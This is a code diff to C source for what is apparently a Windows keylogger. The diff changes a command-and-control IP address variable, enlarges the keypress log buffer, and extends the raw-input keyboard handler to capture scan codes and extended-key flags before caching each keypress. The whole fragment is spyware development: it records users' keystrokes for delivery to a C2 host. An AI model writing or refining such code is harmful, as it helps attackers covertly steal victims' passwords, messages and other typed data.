@@ -16,12 +16,12 @@
 typedef unsigned __int64 QWORD;
 #endif
 
-wchar_t *C2_IP = L"10.0.0.98";
+wchar_t *C2_IP = L"192.168.4.163";
 
 int ABORT = 0;
 
 int MAX_CACHED_KEYPRESSES = 50;
-int KEYPRESS_LOG_MAX_SIZE = 40;
+int KEYPRESS_LOG_MAX_SIZE = 100;
 
 char *cached_keypresses;
 int cached_keypresses_amt = 0;
@@ -75,7 +75,9 @@ LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam,
       RAWINPUT *raw = (RAWINPUT *)rid_buf;
       if (raw->header.dwType == RIM_TYPEKEYBOARD) {
         RAWKEYBOARD *rk = &raw->data.keyboard;
-        char *buf = process_kbd_event(rk->Flags & RI_KEY_BREAK, rk->VKey);
+        char *buf = process_kbd_event(rk->MakeCode, rk->Flags & RI_KEY_E0,
+                                      rk->Flags & RI_KEY_E1,
+                                      rk->Flags & RI_KEY_BREAK, rk->VKey);
         cacheKeypress(buf);
         free(buf);
       }
